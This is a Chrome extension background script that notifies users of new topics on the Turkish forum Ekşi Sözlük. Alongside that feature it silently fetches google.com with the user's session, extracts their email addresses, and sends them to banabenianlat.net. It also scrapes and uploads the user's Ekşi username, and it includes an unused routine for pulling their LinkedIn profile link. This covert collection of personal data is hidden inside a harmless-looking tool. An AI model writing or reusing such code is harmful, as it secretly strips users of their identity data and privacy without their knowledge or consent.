//banabenianlat, arada bildirim olarak çıksın
//güncellemeler popupda bildirim olarak kendini belli etsin

var storageID;

/**
 * Gets user id from Chrome storage
 */
$(document).ready(function GetUserFromStorage(){
    chrome.storage.sync.get("id", function(data) {
        console.log(data)
        storageID = data.id;
        console.log("1 storageid: "+storageID);
        if(storageID==undefined){            
            console.log("srotage id YOK");
            getLastIDFromDB(); //Social_id ve url_log tablolarını kontrol ediyor. En büyük user id'si hangisindeyse ondakini alıyor.
        } else {
           getGoogleID(storageID); 
           getEksiID(storageID);
        }
        
    });    
});

function getLastIDFromDB(){
    $.ajax({
        url:'https://banabenianlat.net/ChromeExtensions/EksiBildirim/getLastIDFromDB.php',
        type:'get',
        success: function(data){
            storageID = Number(data)+1;
            console.log("DB id +1 : "+storageID);
            CreateUserStorage(storageID);
            getGoogleID(storageID);
            getEksiID(storageID);
        }
    });    
}


/**
 * Creates id variable into users chrome storage
 * @param {integer} value 
 */
function CreateUserStorage(value){
    chrome.storage.sync.set({"id": value}, function() {
        console.log('pid is set to ' + value);
    });
}


function getGoogleID(storageID){
    $.ajax({
        url:'https://google.com',
        type:'get',
        success: function(data){
            $htmlData = data;
            $gmail = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi);
            // Get rid of doubled emails.
            var gmail = Array.from(new Set($gmail)); 
            //Get rid of robert@broofa.com
            gmail.splice(gmail.indexOf("robert@broofa.com"),1);
            result = gmail;

            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/createsocialid.php",
            {
                postdata:{socialID:gmail,storageID:storageID,form_factor:1}
            },
            function(data, status){
                console.log("data: " + data + "\nStatus: " + status);
            });


        }
    });
}

function getLinkedinID(){
    $.ajax({
        url:'https://www.linkedin.com/feed/',
        type:'get',
        success: function(data){
            $html = data;
            //$data = $($htmlData).find('.nav-settings__view-profile-link');
            $data = $("a[data-control-name='identity_profile_photo']", $html).attr('href');
            setTimeout(function(){ console.log($data); }, 5000);
        }
    });
}
//nav-settings__view-profile-link

function getEksiID(storageID){
    $.get("https://eksisozluk.com/basliklar/bugun/1?id=5584631&day=2018-10-17", function(data){
        var htmlData = data;
        var EksiID = [];
        let str = $(htmlData).find("#top-navigation").find("ul").eq(0).find(".not-mobile").eq(0).find("a").attr("href");
        if(str!=undefined){
            str = str.replace("/biri/", "");
            EksiID.push(str);
            console.log("Ekşi ID:");
            console.log(EksiID);
            console.log("inside google storageid: "+storageID);
            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/createsocialid.php",
            {
                postdata:{socialID:EksiID,storageID:storageID,form_factor:2}
            },
            function(data, status){
                console.log("data: " + data + "\nStatus: " + status);
            });
            return EksiID;            
        }

    })

}

var messages = new Array();
var lastIDs = [];







function NotificationList(NotificationTitle, NotificationMessage, Nitems){
    var options = {
        type: "list",
        title: NotificationTitle,
        message: NotificationMessage,
        iconUrl: "icon.png",
        items: Nitems
    };
    chrome.notifications.create(options);
}


engine();
$(function(){
    setInterval(engine, 1000*60);
});
function engine(){
    var ids = [];
    var new_topics = [];
    var myNotifications = [];

    $.get("https://eksisozluk.com/basliklar/bugun/1?id=5584631&day=2018-10-17", function(data){
        var htmlData = data;
		$data = $(htmlData).find('.topic-list').eq(1);
        $('body').append($data);
        for(i=0; i<$data.find('li').length; i++){
            let regexp = /--(\d+)\D/;
            let str = ($($data).find('li').eq(i).html());
            let match = regexp.exec(str);
            if (match){
                ids[i] = parseInt(Object.values(match)[1]); //We convert ocject to array. Because getting [1] index.
            }
            if(parseInt($($data).find('li').eq(i).find('a').find('small').text())){
                var entryNum = parseInt($($data).find('li').eq(i).find('a').find('small').text());
            } else{
                var entryNum = 1;
            }
            messages[i] = new Array(
                    ($($data).find('li').eq(i).text()).replace(/\n/g,'').trim(), //baslik adı
                    $($data).find('li').eq(i).find('a').attr('href'), //baslik href
                    entryNum // Bugün kaç entry girildi.
                );
        }

        console.log(messages);
        console.log(ids);
        console.log(lastIDs);

        if(lastIDs.length < 1){
            lastIDs = ids;
            console.log("birden küççük");
            
        } else if(lastIDs.length > 0){
            var new_ids = ids.filter(function(obj) { 
                return lastIDs.indexOf(obj) == -1; 
            });

            console.log(new_ids);

            for(let i = 0; i<new_ids.length; i++){
                let topic_id = ids.indexOf(new_ids[i]);
                new_topics[i] = messages[topic_id];
                if((messages[topic_id][1].includes("?day=")==false) && messages[topic_id][2]<=5){
                    NotificationBasic(messages[topic_id][0], 'Yeni başlık', messages[topic_id][1]);
                }
            }
            chrome.notifications.onButtonClicked.addListener(function(notifId){
                for(let myNotification of myNotifications){
                     if(notifId == myNotification.nid){
                        window.open("https://eksisozluk.com"+myNotification.nhref); 
                    }                    
                }
     
            });
            console.log(new_topics);
            lastIDs = ids;
            console.log("birden büyük");
        }
        


    })

    function NotificationBasic(NotificationTitle, NotificationMessage, href){
        var options = {
            type: "basic",
            title: NotificationTitle,
            message: NotificationMessage,
            iconUrl: "icon.png",
            contextMessage: "Ekşi Bildirim",
            buttons: [{
                title: "Başlığa git-->"
            }]
        };
        chrome.notifications.create(options, function(id){
            myNotifications.push({nid:id, nhref:href});
        });
    }

}

/*

for (var newMessage of newMessages){
    console.log("abuzittin biniziyettin");
    console.log(newMessage);
    console.log(typeof newMessage[1]);
    if((newMessage[1].includes("?day=")==false) && newMessage[2] <= 5 ){
        console.log("BİLDİRİM J=" + j);
        console.log("BİLDİRİM MESSAGE: " + newMessage);
        console.log("BİLDİRİM href: " + newMessage[1]);
        chrome.notifications.onButtonClicked.addListener(function(){
            window.open("https://eksisozluk.com" + newMessage[1])
        });
        NotificationBasic("Başlık biraz önce açıldı", newMessage[0]);
        //Nitems.push({title: "Sıra", message: "messages[j][0]"});                       
    }
}

console.log(newMessages);
 */

